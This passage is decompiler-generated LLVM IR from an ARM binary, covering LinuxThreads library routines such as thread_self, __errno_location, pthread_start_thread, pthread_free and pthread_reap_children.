  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_acb0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_ac5c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_ace0 = load i32, i32* @r0, align 4
  ret i32 %v1_ace0
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_ace8 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_acec = load i32, i32* @sp, align 4
  %v2_acec = sub i32 %v0_acec, %v2_ace8
  %v3_acec = icmp ult i32 %v0_acec, %v2_ace8
  %v4_acec = xor i32 %v0_acec, %v2_ace8
  %v5_acec = xor i32 %v2_acec, %v0_acec
  %v6_acec = and i32 %v5_acec, %v4_acec
  %v7_acec = icmp slt i32 %v6_acec, 0
  store i1 %v7_acec, i1* @cpsr_v, align 1
  %v9_acec = icmp eq i32 %v0_acec, %v2_ace8
  store i1 %v9_acec, i1* @cpsr_z, align 1
  %v1_acf0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_acf0, i32* @r1, align 4
  br i1 %v3_acec, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_ad0c, %entry
  %merge = phi i32 [ 176320, %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_ad0c ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_ad00 = load i32, i32* @global_var_2be50.182, align 4
  %v3_ad04 = icmp ult i32 %v0_acec, %v2_ad00
  br i1 %v3_ad04, label %bb4, label %dec_label_pc_ad0c

dec_label_pc_ad0c:                                ; preds = %bb3
  %v2_ad10 = load i32, i32* @global_var_2be54.184, align 4
  %v2_ad14 = sub i32 %v0_acec, %v2_ad10
  %v3_ad14 = icmp ult i32 %v0_acec, %v2_ad10
  %v4_ad14 = xor i32 %v2_ad10, %v0_acec
  %v5_ad14 = xor i32 %v2_ad14, %v0_acec
  %v6_ad14 = and i32 %v5_ad14, %v4_ad14
  %v7_ad14 = icmp slt i32 %v6_ad14, 0
  store i1 %v7_ad14, i1* @cpsr_v, align 1
  %v9_ad14 = icmp eq i32 %v0_acec, %v2_ad10
  store i1 %v9_ad14, i1* @cpsr_z, align 1
  br i1 %v3_ad14, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_ad0c, %bb3
  %v2_ad24 = load i32, i32* @global_var_30238.188, align 4
  store i32 %v2_ad24, i32* @r2, align 4
  %v3_ad28 = and i32 %v1_acf0, -2097152
  %v4_ad28 = xor i32 %v3_ad28, -2097152
  store i1 false, i1* @cpsr_v, align 1
  %v2_ad30 = icmp eq i32 %v2_ad24, 0
  store i1 %v2_ad30, i1* @cpsr_z, align 1
  %v1_ad34 = sub i32 -477, %v4_ad28
  br i1 %v2_ad30, label %dec_label_pc_ad40, label %dec_label_pc_ad3c

dec_label_pc_ad3c:                                ; preds = %bb4
  %v1_ad3c = call i32 @__pthread_find_self(i32 %v1_ad34)
  br label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %bb4, %dec_label_pc_ad3c
  %v0_ad40 = phi i32 [ %v1_ad34, %bb4 ], [ %v1_ad3c, %dec_label_pc_ad3c ]
  %v1_ad40 = add i32 %v0_ad40, -3
  ret i32 %v1_ad40

; uselistorder directives
  uselistorder i32 %v1_ad34, { 1, 0 }
  uselistorder i32 %v2_ad10, { 2, 0, 3, 1 }
  uselistorder i32 %v0_acec, { 5, 0, 1, 6, 4, 7, 9, 2, 3, 8, 10 }
  uselistorder i32 %v2_ace8, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_ad40, { 1, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  %v0_ad64 = call i32 @thread_self()
  %v1_ad68 = add i32 %v0_ad64, 76
  %v2_ad68 = inttoptr i32 %v1_ad68 to i32*
  %v3_ad68 = load i32, i32* %v2_ad68, align 4
  ret i32 %v3_ad68
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  %v0_ad74 = call i32 @thread_self()
  %v1_ad78 = add i32 %v0_ad74, 68
  %v2_ad78 = inttoptr i32 %v1_ad78 to i32*
  %v3_ad78 = load i32, i32* %v2_ad78, align 4
  ret i32 %v3_ad78
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ad80 = load i32, i32* @r4, align 4
  store i32 %v3_ad80, i32* %stack_var_-12, align 4
  %v3_ad88 = load i32, i32* @global_var_2b2b8.190, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v7_ad9c = icmp slt i32 %v3_ad88, %arg1
  br i1 %v7_ad9c, label %dec_label_pc_ada0, label %dec_label_pc_add0

dec_label_pc_ada0:                                ; preds = %entry
  %v0_ada0 = call i32 @sched_get_priority_max()
  store i32 ptrtoint (i32* @global_var_2b2a0.186 to i32), i32* @r4, align 4
  %v0_ada8 = load i32, i32* %r5.global-to-local, align 4
  %v5_adb4 = icmp slt i32 %v0_ada8, %v0_ada0
  br i1 %v5_adb4, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_ada0
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_ada0, %bb
  %v0_adc8 = call i32 @sched_setscheduler()
  %v0_adcc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_adcc, i32* @global_var_2b2b8.190, align 4
  %v2_add4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %entry, %bb8
  %v11_add4 = phi i32 [ 1, %entry ], [ %v0_adc8, %bb8 ]
  %v2_add4 = phi i32 [ %v3_ad80, %entry ], [ %v2_add4.pre, %bb8 ]
  store i32 %v2_add4, i32* @r4, align 4
  ret i32 %v11_add4

; uselistorder directives
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %v2_ade4 = load i32, i32* @global_var_2bd10.193, align 4
  %v2_ade8 = icmp eq i32 %v2_ade4, 0
  %v2_adec = ptrtoint i32* %stack_var_-152 to i32
  br i1 %v2_ade8, label %dec_label_pc_adf8, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

dec_label_pc_adf8:                                ; preds = %entry
  %v2_adfc = load i32, i32* @global_var_2bd14.195, align 4
  %v2_ae00 = icmp eq i32 %v2_adfc, 0
  br i1 %v2_ae00, label %thread-pre-split, label %bb6

bb6:                                              ; preds = %dec_label_pc_adf8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_adf8, %bb, %bb6
  %v0_ae08 = phi i1 [ true, %bb ], [ false, %bb6 ], [ true, %dec_label_pc_adf8 ]
  store i32 1, i32* @global_var_2bd10.193, align 4
  br i1 %v0_ae08, label %.dec_label_pc_ae58_crit_edge, label %dec_label_pc_ae1c

.dec_label_pc_ae58_crit_edge:                     ; preds = %thread-pre-split
  %v5_ae5c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_ae58

dec_label_pc_ae1c:                                ; preds = %thread-pre-split
  store i32 0, i32* %stack_var_-152, align 4
  br label %dec_label_pc_ae2c

dec_label_pc_ae2c:                                ; preds = %dec_label_pc_ae48, %dec_label_pc_ae1c
  store i32 %v2_adec, i32* @r1, align 4
  %v2_ae34 = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_ae34, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_ae3c = call i32 @__libc_write(i32 %v2_ae34, i32 %v2_adec)
  %v3_ae40 = icmp eq i32 %v2_ae3c, -1
  br i1 %v3_ae40, label %dec_label_pc_ae48, label %dec_label_pc_ae58

dec_label_pc_ae48:                                ; preds = %dec_label_pc_ae2c
  %v0_ae48 = call i32 @__errno_location()
  %v1_ae4c = inttoptr i32 %v0_ae48 to i32*
  %v2_ae4c = load i32, i32* %v1_ae4c, align 4
  %v7_ae50 = icmp eq i32 %v2_ae4c, 4
  br i1 %v7_ae50, label %dec_label_pc_ae2c, label %dec_label_pc_ae58

dec_label_pc_ae58:                                ; preds = %dec_label_pc_ae2c, %dec_label_pc_ae48, %.dec_label_pc_ae58_crit_edge
  %v5_ae5c = phi i32 [ %v5_ae5c.pre, %.dec_label_pc_ae58_crit_edge ], [ %v2_ae3c, %dec_label_pc_ae2c ], [ %v0_ae48, %dec_label_pc_ae48 ]
  ret i32 %v5_ae5c

; uselistorder directives
  uselistorder i32 %v2_adec, { 1, 0 }
  uselistorder label %dec_label_pc_ae58, { 1, 0, 2 }
  uselistorder label %thread-pre-split, { 2, 0, 1 }
}

define i32 @pthread_kill_all_threads(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_aea8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_ae70 = load i32, i32* @r4, align 4
  %v9_ae70 = load i32, i32* @r6, align 4
  %v2_ae74 = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  %v0_ae7c = load i32, i32* %r0.global-to-local, align 4
  %v2_aea8 = icmp eq i32 %arg2, 0
  store i1 %v2_aea8, i1* @cpsr_z, align 1
  br i1 %v2_aea8, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_aea8
  store i32 %v3_ae70, i32* @r4, align 4
  store i32 %v9_ae70, i32* @r6, align 4
  ret i32 %v0_ae7c

bb9:                                              ; preds = %dec_label_pc_aea8
  %v1_aeb0 = add i32 %v2_ae74, 20
  %v2_aeb0 = inttoptr i32 %v1_aeb0 to i32*
  %v3_aeb0 = load i32, i32* %v2_aeb0, align 4
  store i32 %v3_aeb0, i32* %r0.global-to-local, align 4
  store i32 %v3_ae70, i32* @r4, align 4
  %v0_aeb8 = call i32 @kill()
  store i32 %v0_aeb8, i32* %r0.global-to-local, align 4
  %v0_aebc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_aebc, label %bb10, label %bb11

bb10:                                             ; preds = %bb9
  br label %bb11

bb11:                                             ; preds = %bb9, %bb10
  ret i32 %v0_aeb8

; uselistorder directives
  uselistorder i32 %v3_ae70, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %v2_aec0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_aec8 = call i32 @__libc_getpid()
  %v0_aecc = load i32, i32* @r4, align 4
  %v1_aecc = add i32 %v0_aecc, 100
  %v2_aed0 = add i32 %v0_aecc, 20
  %v3_aed0 = inttoptr i32 %v2_aed0 to i32*
  store i32 %v0_aec8, i32* %v3_aed0, align 4
  %v3_aedc = inttoptr i32 %v1_aecc to %_TYPEDEF_sigset_t*
  %v4_aedc = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_aedc, i32 0)
  %v0_aee0 = load i32, i32* @r4, align 4
  %v1_aee0 = add i32 %v0_aee0, 228
  %v2_aee0 = inttoptr i32 %v1_aee0 to i32*
  %v3_aee0 = load i32, i32* %v2_aee0, align 4
  %v1_aee4 = icmp slt i32 %v3_aee0, 0
  br i1 %v1_aee4, label %dec_label_pc_aef4, label %bb

bb:                                               ; preds = %entry
  br label %dec_label_pc_af14

dec_label_pc_aef4:                                ; preds = %entry
  %v3_aef8 = load i32, i32* @global_var_2b2b8.190, align 4
  %tmp5 = icmp slt i32 %v3_aef8, 1
  br i1 %tmp5, label %dec_label_pc_af18, label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef4
  br label %dec_label_pc_af14

dec_label_pc_af14:                                ; preds = %bb, %dec_label_pc_af04
  %v0_af14 = call i32 @sched_setscheduler()
  br label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_aef4, %dec_label_pc_af14
  %v2_af1c = load i32, i32* @global_var_30248.202, align 4
  %v2_af20 = icmp eq i32 %v2_af1c, 0
  br i1 %v2_af20, label %dec_label_pc_af78, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af18
  %v2_af2c = load i32, i32* @global_var_2b490.204, align 4
  %tmp6 = icmp slt i32 %v2_af2c, 1
  br i1 %tmp6, label %dec_label_pc_af78, label %dec_label_pc_af38

dec_label_pc_af38:                                ; preds = %dec_label_pc_af28
  %v0_af40 = load i32, i32* @r4, align 4
  store i32 %v0_af40, i32* %stack_var_-152, align 4
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_af60, %dec_label_pc_af38
  store i32 %v2_aec0, i32* @r1, align 4
  %v2_af4c = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_af4c, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_af54 = call i32 @__libc_write(i32 %v2_af4c, i32 %v2_aec0)
  %v3_af58 = icmp eq i32 %v2_af54, -1
  br i1 %v3_af58, label %dec_label_pc_af60, label %dec_label_pc_af70

dec_label_pc_af60:                                ; preds = %dec_label_pc_af44
  %v0_af60 = call i32 @__errno_location()
  %v1_af64 = inttoptr i32 %v0_af60 to i32*
  %v2_af64 = load i32, i32* %v1_af64, align 4
  %v7_af68 = icmp eq i32 %v2_af64, 4
  br i1 %v7_af68, label %dec_label_pc_af44, label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_af44, %dec_label_pc_af60
  %v0_af70 = load i32, i32* @r4, align 4
  %v1_af74 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_af70)
  br label %dec_label_pc_af78

dec_label_pc_af78:                                ; preds = %dec_label_pc_af28, %dec_label_pc_af18, %dec_label_pc_af70
  %v0_af78 = load i32, i32* @r4, align 4
  %v1_af78 = add i32 %v0_af78, 96
  %v2_af78 = inttoptr i32 %v1_af78 to i32*
  %v3_af78 = load i32, i32* %v2_af78, align 4
  store i32 44932, i32* @lr, align 4
  %v1_af80 = add i32 %v0_af78, 92
  %v2_af80 = inttoptr i32 %v1_af80 to i32*
  %v3_af80 = load i32, i32* %v2_af80, align 4
  call void @__pseudo_branch(i32 %v3_af80)
  %v2_af88 = call i32 @__pthread_do_exit(i32 %v3_af78, i32 %v2_aec0)
  ret i32 %v2_af88

; uselistorder directives
  uselistorder i32 %v2_aec0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_af78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af70, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_af14, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  %v0_afa0 = call i32 @__libc_getpid()
  %v1_afa8 = load i32, i32* @r4, align 4
  %v2_afa8 = add i32 %v1_afa8, 20
  %v3_afa8 = inttoptr i32 %v2_afa8 to i32*
  store i32 %v0_afa0, i32* %v3_afa8, align 4
  %v0_afac = load i32, i32* @r4, align 4
  %v1_afac = add i32 %v0_afac, 28
  %v2_afac = inttoptr i32 %v1_afac to i32*
  %v3_afac = load i32, i32* %v2_afac, align 4
  %v2_afb0 = call i32 @__pthread_lock(i32 %v3_afac, i32 0)
  %v0_afb4 = load i32, i32* @r4, align 4
  %v1_afb4 = add i32 %v0_afb4, 28
  %v2_afb4 = inttoptr i32 %v1_afb4 to i32*
  %v3_afb4 = load i32, i32* %v2_afb4, align 4
  %v1_afb8 = call i32 @__pthread_unlock(i32 %v3_afb4)
  %v0_afbc = load i32, i32* @r4, align 4
  %v1_afc0 = call i32 @pthread_start_thread(i32 %v0_afbc)
  ret i32 %v1_afc0
}

define i32 @pthread_free(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_afc4 = add i32 %arg1, 16
  %v2_afc4 = inttoptr i32 %v1_afc4 to i32*
  %v3_afc4 = load i32, i32* %v2_afc4, align 4
  %v3_afc8 = load i32, i32* @r4, align 4
  store i32 %v3_afc8, i32* %stack_var_-12, align 4
  %v6_afc8 = load i32, i32* @r5, align 4
  %v3_afd4 = urem i32 %v3_afc4, 1024
  %v4_afd8 = mul nuw nsw i32 %v3_afd4, 16
  %v5_afd8 = add i32 %v4_afd8, ptrtoint (i32* @global_var_270a0.207 to i32)
  store i32 %v5_afd8, i32* %r4.global-to-local, align 4
  %v2_afe8 = call i32 @__pthread_lock(i32 %v5_afd8, i32 0)
  %v2_aff0 = add i32 %v4_afd8, add (i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32 8)
  %v3_aff0 = inttoptr i32 %v2_aff0 to i32*
  store i32 0, i32* %v3_aff0, align 4
  %v1_aff8 = load i32, i32* %r4.global-to-local, align 4
  %v2_aff8 = add i32 %v1_aff8, 12
  %v3_aff8 = inttoptr i32 %v2_aff8 to i32*
  store i32 -1, i32* %v3_aff8, align 4
  %v0_affc = load i32, i32* %r4.global-to-local, align 4
  %v1_b000 = call i32 @__pthread_unlock(i32 %v0_affc)
  %v2_b008 = load i32, i32* @global_var_2b0a0.209, align 4
  %v0_b00c = load i32, i32* @r5, align 4
  %v1_b00c = add i32 %v0_b00c, 448
  %v2_b00c = inttoptr i32 %v1_b00c to i32*
  %v3_b00c = load i32, i32* %v2_b00c, align 4
  store i32 %v3_b00c, i32* %r4.global-to-local, align 4
  %v1_b010 = add i32 %v2_b008, -1
  store i32 %v1_b010, i32* @global_var_2b0a0.209, align 4
  store i32 %v3_b00c, i32* @r0, align 4
  %v2_b0245 = icmp eq i32 %v3_b00c, 0
  br i1 %v2_b0245, label %dec_label_pc_b02c, label %dec_label_pc_b01c

dec_label_pc_b01c:                                ; preds = %entry, %dec_label_pc_b01c
  %v0_b01c = phi i32 [ %v0_b024, %dec_label_pc_b01c ], [ %v3_b00c, %entry ]
  %v1_b01c = inttoptr i32 %v0_b01c to i32*
  %v2_b01c = load i32, i32* %v1_b01c, align 4
  store i32 %v2_b01c, i32* @r4, align 4
  %v0_b020 = call i32 @free()
  %v0_b024 = load i32, i32* @r4, align 4
  store i32 %v0_b024, i32* @r0, align 4
  %v2_b024 = icmp eq i32 %v0_b024, 0
  br i1 %v2_b024, label %dec_label_pc_b024.dec_label_pc_b02c_crit_edge, label %dec_label_pc_b01c

dec_label_pc_b024.dec_label_pc_b02c_crit_edge:    ; preds = %dec_label_pc_b01c
  %v0_b02c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b02c

dec_label_pc_b02c:                                ; preds = %dec_label_pc_b024.dec_label_pc_b02c_crit_edge, %entry
  %v0_b02c = phi i32 [ %v0_b02c.pre, %dec_label_pc_b024.dec_label_pc_b02c_crit_edge ], [ %v0_b00c, %entry ]
  %v1_b02c = add i32 %v0_b02c, 452
  %v2_b02c = inttoptr i32 %v1_b02c to i32*
  %v3_b02c = load i32, i32* %v2_b02c, align 4
  store i32 %v3_b02c, i32* %r4.global-to-local, align 4
  store i32 %v3_b02c, i32* @r0, align 4
  %v2_b03c2 = icmp eq i32 %v3_b02c, 0
  br i1 %v2_b03c2, label %dec_label_pc_b044, label %dec_label_pc_b034

dec_label_pc_b034:                                ; preds = %dec_label_pc_b02c, %dec_label_pc_b034
  %v0_b034 = phi i32 [ %v0_b03c.pr, %dec_label_pc_b034 ], [ %v3_b02c, %dec_label_pc_b02c ]
  %v1_b034 = inttoptr i32 %v0_b034 to i32*
  %v2_b034 = load i32, i32* %v1_b034, align 4
  store i32 %v2_b034, i32* @r4, align 4
  %v0_b038 = call i32 @free()
  %v0_b03c.pr = load i32, i32* @r4, align 4
  store i32 %v0_b03c.pr, i32* @r0, align 4
  %v2_b03c = icmp eq i32 %v0_b03c.pr, 0
  br i1 %v2_b03c, label %dec_label_pc_b03c.dec_label_pc_b044_crit_edge, label %dec_label_pc_b034

dec_label_pc_b03c.dec_label_pc_b044_crit_edge:    ; preds = %dec_label_pc_b034
  %v0_b048.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b044

dec_label_pc_b044:                                ; preds = %dec_label_pc_b03c.dec_label_pc_b044_crit_edge, %dec_label_pc_b02c
  %v1_b064 = phi i32 [ %v0_b048.pre, %dec_label_pc_b03c.dec_label_pc_b044_crit_edge ], [ %v0_b02c, %dec_label_pc_b02c ]
  %v9_b048 = icmp eq i32 %v1_b064, ptrtoint (i32* @global_var_2b0c0 to i32)
  br i1 %v9_b048, label %bb, label %bb13

bb:                                               ; preds = %dec_label_pc_b044
  %v3_b04c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_b04c, i32* @r4, align 4
  store i32 %v6_afc8, i32* @r5, align 4
  ret i32 0

bb13:                                             ; preds = %dec_label_pc_b044
  %v1_b050 = add i32 %v1_b064, 392
  %v2_b050 = inttoptr i32 %v1_b050 to i32*
  %v3_b050 = load i32, i32* %v2_b050, align 4
  %v2_b054 = icmp eq i32 %v3_b050, 0
  br i1 %v2_b054, label %bb15, label %bb14

bb14:                                             ; preds = %bb13
  %v3_b058 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_b058, i32* @r4, align 4
  store i32 %v6_afc8, i32* @r5, align 4
  ret i32 0

bb15:                                             ; preds = %bb13
  %v1_b05c = add i32 %v1_b064, 400
  %v2_b05c = inttoptr i32 %v1_b05c to i32*
  %v3_b05c = load i32, i32* %v2_b05c, align 4
  %v2_b060 = icmp eq i32 %v3_b05c, 0
  br i1 %v2_b060, label %bb17, label %bb16

bb16:                                             ; preds = %bb15
  br label %bb17

bb17:                                             ; preds = %bb15, %bb16
  %v1_b068 = xor i1 %v2_b060, true
  call void @__pseudo_cond_branch(i1 %v1_b068, i32 ptrtoint (i32* @global_var_103d0.211 to i32))
  %v2_b078 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b078, i32* @r4, align 4
  %v0_b07c = call i32 @munmap()
  ret i32 %v0_b07c

; uselistorder directives
  uselistorder i32 %v0_b03c.pr, { 2, 1, 0 }
  uselistorder i32 %v0_b024, { 2, 1, 0 }
  uselistorder i32 %v3_b00c, { 0, 2, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_b034, { 1, 0 }
  uselistorder label %dec_label_pc_b01c, { 1, 0 }
}

define i32 @restart(i32 %arg1) local_unnamed_addr {
entry:
  %v0_b090 = call i32 @__pthread_restart_new()
  ret i32 %v0_b090
}

define i32 @pthread_reap_children() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_b094 = load i32, i32* @r4, align 4
  %v6_b094 = load i32, i32* @r5, align 4
  %v2_b098 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_b19c

dec_label_pc_b0a0:                                ; preds = %dec_label_pc_b19c
  store i32 ptrtoint (i32** @global_var_2b480.199 to i32), i32* %r3.global-to-local, align 4
  %v2_b0a4 = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  br label %dec_label_pc_b144

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b144
  %v1_b0b0 = add i32 %v0_b0c0, 20
  %v2_b0b0 = inttoptr i32 %v1_b0b0 to i32*
  %v3_b0b0 = load i32, i32* %v2_b0b0, align 4
  store i32 %v3_b0b0, i32* %r3.global-to-local, align 4
  %v9_b0b4 = icmp eq i32 %v3_b0b0, %v3_b1a8
  %v1_b0b8 = inttoptr i32 %v0_b0c0 to i32*
  %v2_b0b8 = load i32, i32* %v1_b0b8, align 4
  store i32 %v2_b0b8, i32* %r2.global-to-local, align 4
  br i1 %v9_b0b4, label %dec_label_pc_b0c0, label %dec_label_pc_b144

dec_label_pc_b0c0:                                ; preds = %dec_label_pc_b0b0
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v1_b0c0 = add i32 %v0_b0c0, 4
  %v2_b0c0 = inttoptr i32 %v1_b0c0 to i32*
  %v3_b0c0 = load i32, i32* %v2_b0c0, align 4
  store i32 %v3_b0c0, i32* %r3.global-to-local, align 4
  %v2_b0c4 = add i32 %v2_b0b8, 4
  %v3_b0c4 = inttoptr i32 %v2_b0c4 to i32*
  store i32 %v3_b0c0, i32* %v3_b0c4, align 4
  %v0_b0c8 = load i32, i32* @r5, align 4
  %v1_b0c8 = add i32 %v0_b0c8, 4
  %v2_b0c8 = inttoptr i32 %v1_b0c8 to i32*
  %v3_b0c8 = load i32, i32* %v2_b0c8, align 4
  store i32 %v3_b0c8, i32* %r3.global-to-local, align 4
  %v1_b0cc = add i32 %v0_b0c8, 28
  %v2_b0cc = inttoptr i32 %v1_b0cc to i32*
  %v3_b0cc = load i32, i32* %v2_b0cc, align 4
  %v0_b0d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_b0d0 = inttoptr i32 %v3_b0c8 to i32*
  store i32 %v0_b0d0, i32* %v2_b0d0, align 4
  %v2_b0d8 = call i32 @__pthread_lock(i32 %v3_b0cc, i32 0)
  store i32 %v2_b0d8, i32* @r0, align 4
  %v0_b0dc = load i32, i32* @r5, align 4
  %v1_b0dc = add i32 %v0_b0dc, 412
  %v2_b0dc = inttoptr i32 %v1_b0dc to i32*
  %v3_b0dc = load i32, i32* %v2_b0dc, align 4
  %v2_b0e0 = icmp eq i32 %v3_b0dc, 0
  store i1 %v2_b0e0, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_b0e8 = add i32 %v0_b0dc, 46
  %v4_b0e8 = inttoptr i32 %v3_b0e8 to i8*
  store i8 1, i8* %v4_b0e8, align 1
  %v0_b0ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0ec, label %dec_label_pc_b120, label %dec_label_pc_b0f0

dec_label_pc_b0f0:                                ; preds = %dec_label_pc_b0c0
  store i32 ptrtoint (i32* @global_var_3023c.215 to i32), i32* %r3.global-to-local, align 4
  %v0_b0f4 = load i32, i32* @r5, align 4
  %v1_b0f4 = add i32 %v0_b0f4, 416
  %v2_b0f4 = inttoptr i32 %v1_b0f4 to i32*
  %v3_b0f4 = load i32, i32* %v2_b0f4, align 4
  store i32 %v3_b0f4, i32* %r2.global-to-local, align 4
  %v2_b0f8 = load i32, i32* @global_var_3023c.215, align 4
  %v2_b0fc = or i32 %v2_b0f8, %v3_b0f4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v1_b100 = and i32 %v2_b0fc, 2048
  %v2_b100 = icmp eq i32 %v1_b100, 0
  store i1 %v2_b100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b100, label %dec_label_pc_b120, label %dec_label_pc_b108

dec_label_pc_b108:                                ; preds = %dec_label_pc_b0f0
  %v2_b10c = add i32 %v0_b0f4, 424
  %v3_b10c = inttoptr i32 %v2_b10c to i32*
  store i32 12, i32* %v3_b10c, align 4
  store i32 ptrtoint (i32* @global_var_30244.217 to i32), i32* %r3.global-to-local, align 4
  %v0_b114 = load i32, i32* @r5, align 4
  %v2_b114 = add i32 %v0_b114, 428
  %v3_b114 = inttoptr i32 %v2_b114 to i32*
  store i32 %v0_b114, i32* %v3_b114, align 4
  %v0_b118 = load i32, i32* @r5, align 4
  %v1_b118 = load i32, i32* %r3.global-to-local, align 4
  %v2_b118 = inttoptr i32 %v1_b118 to i32*
  store i32 %v0_b118, i32* %v2_b118, align 4
  %v1_b11c = call i32 @__linuxthreads_reap_event(i32 %v2_b0d8)
  br label %dec_label_pc_b120

dec_label_pc_b120:                                ; preds = %dec_label_pc_b0f0, %dec_label_pc_b0c0, %dec_label_pc_b108
  %v0_b120 = load i32, i32* @r5, align 4
  %v1_b120 = add i32 %v0_b120, 45
  %v2_b120 = inttoptr i32 %v1_b120 to i8*
  %v3_b120 = load i8, i8* %v2_b120, align 1
  %v4_b120 = zext i8 %v3_b120 to i32
  store i32 %v4_b120, i32* @r4, align 4
  %v1_b124 = add i32 %v0_b120, 28
  %v2_b124 = inttoptr i32 %v1_b124 to i32*
  %v3_b124 = load i32, i32* %v2_b124, align 4
  %v1_b128 = call i32 @__pthread_unlock(i32 %v3_b124)
  %v0_b12c = load i32, i32* @r4, align 4
  %v2_b12c = icmp eq i32 %v0_b12c, 0
  store i1 %v2_b12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b12c, label %dec_label_pc_b14c, label %dec_label_pc_b134

dec_label_pc_b134:                                ; preds = %dec_label_pc_b120
  %v0_b134 = load i32, i32* @r5, align 4
  %v1_b138 = call i32 @pthread_free(i32 %v0_b134)
  br label %dec_label_pc_b14c

dec_label_pc_b144:                                ; preds = %dec_label_pc_b0b0, %dec_label_pc_b0a0
  %v0_b0c0 = phi i32 [ %v2_b0a4, %dec_label_pc_b0a0 ], [ %v2_b0b8, %dec_label_pc_b0b0 ]
  store i32 %v0_b0c0, i32* @r5, align 4
  %v9_b144 = icmp eq i32 %v0_b0c0, %v2_b0a4
  br i1 %v9_b144, label %dec_label_pc_b14c.loopexit, label %dec_label_pc_b0b0

dec_label_pc_b14c.loopexit:                       ; preds = %dec_label_pc_b144
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b14c

